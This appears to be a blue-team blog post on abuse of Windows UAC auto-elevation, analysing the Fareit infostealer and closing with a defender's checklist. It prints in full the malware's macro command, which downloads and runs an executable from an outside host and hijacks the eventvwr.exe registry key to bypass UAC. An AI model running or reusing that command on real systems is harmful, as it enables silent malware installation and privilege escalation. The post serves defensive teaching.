---
layout: striped-default
title: "When Computer Says Yes (automatically): Understanding UAC Auto-Elevation – Part 2/2"
date: 2025-09-03
tags: [blue-team, uac]
---

## How Attackers Abuse Auto-Elevation
<img src="/assets-striped/posts/2025-09-03-when-computer-says-yes-uac-auto-elevation-part-2/Computer-Says-Yes.jpg" alt="Computer Says Yes" class="center-image">

As we’ve previously mentioned, auto-elevation doesn’t grant magical powers to every user; a standard (non-admin) user cannot force elevation via these binaries. But if the logged-in user is a local admin (running most apps in medium-integrity mode), auto-elevated binaries can be hijacked.
Let us note that abusing auto-elevation allows for a stealthier privilege escalation; by using trusted Windows binaries instead of dropping custom malware, attackers minimize their detection footprint. Defenders may see “normal system activity” in their logs… unless they dig deeper.
<!--more-->

Common attacker techniques include:
- **DLL hijacking**  
  Many Windows executables dynamically load DLLs from specific directories. If an attacker can plant a malicious DLL in that path, and then launch an auto-elevated binary, their DLL will run with admin rights (silently, without a UAC prompt).

- **Misuse of LOLBins (Living Off the Land Binaries)**  
  Some auto-elevated tools can be coerced into executing arbitrary commands or scripts on behalf of the attacker. Since these tools are signed by Microsoft, their activity may be less suspicious to defenders.


<br>
## A Use-Case In the Wild: The Fareit Malware

Fareit was an infostealer (i.e.: an information stealing malware) that was active back in 2016. One of the methods to infect a Windows machine with it was via malicious Word/Excel email attachments, which contained macros (that in turn downloaded & dropped Fareit to disk). [1]

Here’s an example of the command executed by the macro:

```powershell
cmd.exe /c powershell.exe -w hidden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://hawkresultbox.net/logs/sick.exe','%TEMP%\sick.exe') & reg add HKCU\Software\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
```

The macro executes Powershell from a Windows terminal in order to download the malware and save it in Windows’ Temp directory. After that, the macro runs the malware using a very interesting UAC bypass! – Here are the details behind it:

First, we need to understand a few things about the registry in Windows; it is comprised of “hives”, one of which is called **HKEY_CURRENT_USER** (or **HKCU**); another is called **HKEY_CLASSES_ROOT** (or **HKCR**).
As a standard user, one has write access to keys in the **HKEY_CURRENT_USER** hive; if an elevated process interacts with keys one is able to manipulate, one can potentially interfere with actions a high-integrity process is attempting to perform. In other words, if an elevated process is somehow interacting with a registry location that a medium integrity process can tamper with – auto-elevation can be achieved.

As it turned out at the time, “eventvwr.exe” (the Windows Event Viewer) was querying the registry value of _**HKCU\Software\Classes\mscfile\shell\open\command**_ before checking the value of _**HKCR\mscfile\shell\open\command**_. Since the HKCU value returned with “NAME NOT FOUND”, the elevated process queried the HKCR location. [2]
Eventvwr.exe was doing so to start “mmc.exe” (The Microsoft Management Console); after “mmc.exe” loads, it opens “eventvwr.msc” (which is a Microsoft Saved Console file), thus displaying the Event Viewer.

The command **reg add _HKCU\Software\Classes\mscfile\shell\open\command_ /d %tmp%\sick.exe** adds a new data value to the **HKEY_CURRENT_USER** registry (that did not exist there previously), and basically tells windows that whenever a user wishes to load the Event Viewer, Windows should run the command located in that registry value (which is the Fareit malware).
Since “eventvwr.exe” is a high-integrity process which auto-elevates, it therefore caused the malware to run with the same high-integrity level, without popping a UAC consent request to the user.
This vulnerability was of course fixed by Microsoft later on.

<br>

## Defender’s Checklist: Mitigating Auto-Elevation Abuse
So, what can blue teams do to reduce the risk? Here’s a practical set of defensive actions:
- **Limit local administrator accounts**  
  Basic, but always true. The biggest enabler of UAC bypass is that many users are admins on their own machines. Reduce local admin rights wherever possible.
- **Patch DLL hijacking opportunities**  
  Just as basic, still rings true. Ensure that Windows and third-party software are up-to-date, as many DLL hijacking vectors have been patched over the years.
- **Apply application control policies** (AppLocker / WDAC)  
  Use technologies like AppLocker, Microsoft Defender Application Control (MDAC) or other commercial tools to restrict which executables and DLLs can be loaded – even if they are signed by Microsoft.
- **Monitor for LOLBin misuse**  
  Tools like Event Viewer or MMC should rarely be spawning PowerShell or cmd.exe. Set up detection rules in SIEM / EDR for suspicious parent-child process relationships.
- **Review UAC configuration carefully**  
  Raising UAC to “Always notify” makes elevation prompts unavoidable. But… it can hurt usability. Balance policy with business need.

<br>
## Conclusion
UAC was a landmark improvement in Windows security, but like every usability-driven compromise, it comes with trade-offs. Auto-elevation makes life easier for administrators, but it also provides fertile ground for attackers seeking stealthy privilege escalation.
For defenders, awareness is key. Knowing which binaries auto-elevate – and monitoring for suspicious use – can help close a gap that adversaries are all too happy to exploit. As with many aspects of security, the balance between convenience and control is delicate. UAC is a reminder that what helps administrators today can also empower attackers tomorrow.

---
[1] [“Malicious Macro Bypasses UAC to Elevate Privilege for Fareit Malware”](https://www.fortinet.com/blog/threat-research/malicious-macro-bypasses-uac-to-elevate-privilege-for-fareit-malware), Joie Salvio and Rommel Joven

[2] [“Fileless” UAC Bypass Using eventvwr.exe and Registry Hijacking](https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/), enigma0x3